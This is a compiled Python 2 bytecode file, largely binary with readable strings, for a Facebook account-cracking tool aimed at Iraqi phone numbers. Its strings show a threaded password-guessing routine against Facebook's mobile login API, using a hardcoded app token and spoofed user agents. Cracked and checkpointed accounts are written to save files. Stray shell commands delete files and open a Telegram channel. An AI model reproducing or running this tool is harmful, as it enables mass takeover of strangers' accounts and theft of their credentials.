ó
jÊ``c           @   s¸  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d   Z
 e
   e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÆ Wy d  d l Z Wn e k
 r6e  j d	  n Xy d  d l Z Wn8 e k
 re  j d
  e j d  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d
 l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d0 g e  _& d1 g e  _& d   Z' d   Z( e  j d  d   Z) d   Z* d   Z+ d   Z, d Z- g  a. g  Z/ g  a0 d Z1 d Z2 e  j d   d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d!  D]< Z e j d d  Z e d d  e _ e GHe j j   qÐWy d  d l Z Wn e k
 r@e  j d"  n Xy d  d l Z WnE e k
 re  j d#  e j d  e  j d$  e  j d%  n Xd  d
 l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d2 g e  _& d&   Z3 d'   Z, d(   Z4 d)   Z5 d* Z6 Z6 d Z- g  Z7 g  a0 g  a. g  Z/ g  Z8 d+ Z1 d, Z2 e  j d   d-   Z9 d.   Z: e; d/ k r´e9   n  d S(3   iÿÿÿÿNc          C   sÒ   t  t j    t  t j    }  d j |   } d | GHye t j d  j } | | k r d GHt  t j    } t j	 d  n d GHt j	 d  t
 j   Wn, t
 j   t d k rÎ t
 GHt   qÎ n Xd  S(   Nt   -s   [37;

s   rm -rf .txti  iGô i s   .txtt   as4   No Module Named Requests! type:pip2 install requestss6   No Module Named Mechanize! type:pip2 install mechanizei   s   Then type: python2 fbi.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   Thanks.(   R   R   R
   (    (    (    s   /sdcard/Download/xld.pyt   keluar@   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/Download/xld.pyt   acakE   s
    
0s   mkdir anggaxd/cloned.txtc         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q
 W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replaceR   R   t   stdoutt   write(   R$   R%   R'   t   jR   (    (    s   /sdcard/Download/xld.pyR#   N   s    
(
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R+   R,   t   flushR
   R   (   t   zt   e(    (    s   /sdcard/Download/xld.pyt   jalanY   s    
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   
[1;93mPlease Wait [1;93mi   (   R   R+   R.   R
   R   (   t   titikt   o(    (    s   /sdcard/Download/xld.pyt   tik`   s
    

c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s   /sdcard/Download/xld.pyt   psbh   s    
i    s
   [31mNot Vulns	   [32mVulnt   cleari'  s   pip2 install requestss   pip2 install mechanizes   python2 nmbr.pys   xdg-open https://t.me/halohackc           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   R   R   R
   (    (    (    s   /sdcard/Download/xld.pyt   exb   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s   /sdcard/Download/xld.pyR5      s    
c           C   s   t  j d  d  S(   Ni   (   R
   R   (    (    (    s   /sdcard/Download/xld.pyt   t¡   s    c           C   s   t  j d  t  j d  d  S(   NR6   s   xdg-open https://t.me/halohack(   R   t   system(    (    (    s   /sdcard/Download/xld.pyt   cb¥   s    
sR   

[1;92mAUTHOR:@HALO
[1;96mMY TELEGRAM@halohack
[1;97mMY CHANALE@staferor404


s
   [91mNot Vulns	   [91mVulnc           C   sC   t  j d  t GHd d GHd GHd GHd GHd GHd d GHt   d  S(	   NR6   i*   s   [1;91ms   [1]hack iraqs
   [2] tlgrams   [0]BACK           t    s   [1;33m-(   R   R9   R   t   action(    (    (    s   /sdcard/Download/xld.pyt   menu¾   s    
		c             sº  t  d  }  |  d k r' d GHt   nª|  d k rç t j d  t GHt j t j d  t j d  d GHyO t  d	    d
  d } x0 t | d  j   D] } t j | j	    q WWqÑt
 k
 rã d
 GHt  d  t   qÑXnê |  d k rt j d  t j d  nÁ |  d k r¯t j d  t GHd GHyO t  d    d  d } x0 t | d  j   D] } t j | j	    qdWWqÑt
 k
 r«d
 GHt  d  t   qÑXn" |  d k rÅt   n d GHt   t
 t t   } t d |  t j d  t d  t j d  t d  t j d  d d GH   f d   } t d  } | j | t  d d GHd  GHd! t
 t t   d" t
 t t   GHd# GHt  d$  t j d%  d  S(&   Ns%   [1;91mmhalzhera  [1;97m>>>[1;90m  R   s   [!] Fill in correctlyt   1R6   s
   figlet 404s   figlet HALOs   [1;33m750 770 751 771s   [1;33m zhmareyak dane   : s   +964s   .txtt   rs   [!] File Not Founds	   
[ Back ]t   2s   xdg-open https://t.me/halohackt   Fs   [1;91m 14, 19s    choose code  : s   +80t   0s
   [✓] raqam: g¹?s   [1;91mdast pekrdn ba hack ...s   [bowastandn] CTRL+z dagrag      à?i*   s   [1;91m=c            sw  |  } y t  j d  Wn t k
 r* n Xy>| } t j d    | d | d  } t j |  } d | k ré d    | d | d d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  n d | d
 k rhd    | d | d GHt d d
  } | j    | d | d  | j   t j
   | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens   [1;92m[HACK BY HALO][1;92m s    | s   
s   save/successfull.txtR   t   |s   www.facebook.comt	   error_msgs   [1;91m[Check-point][1;91m s   save/checkpoint.txts   >>>(   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR,   t   closet   okst   appendt   cpb(   t   halot   usert   pass1t   datat   qt   okbt   cps(   t   ct   k(    s   /sdcard/Download/xld.pyt   main  s.    
'!!
!
i   s   [1;97m=s,   [✓][1;93m Process Has Been Completed ....s"   [✓][1;92m Total OK/[1;97mCP : t   /s9   [✓][1;97m CP File Has Been Saved : save/checkpoint.txts   
[Press Enter To Go Back]s   python2 .README.md(   t	   raw_inputR<   R   R9   R   RJ   t	   readlinesR   RO   t   stript   IOErrorR=   R7   R   R"   R5   R
   R   R   t   mapRN   RP   (   t   bcht   idlistt   linet   xxxRZ   t   p(    (   RX   RY   s   /sdcard/Download/xld.pyR<   Ê   sv    















		)
R   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](<   R   R   R
   t   datetimeR    t   hashlibt   ret	   threadingRK   t   urllibt	   cookielibt   getpassR   R   R9   t   ranget   nR!   t   nmbrRJ   R+   R.   t   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRI   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R(   R#   R1   R4   R5   t   backRN   R   RP   t   vulnott   vulnR7   R8   R:   R   t
   successfult   listgrupR=   R<   t   __name__(    (    (    s   /sdcard/Download/xld.pyt   <module>   s²   	







		
				









				

		b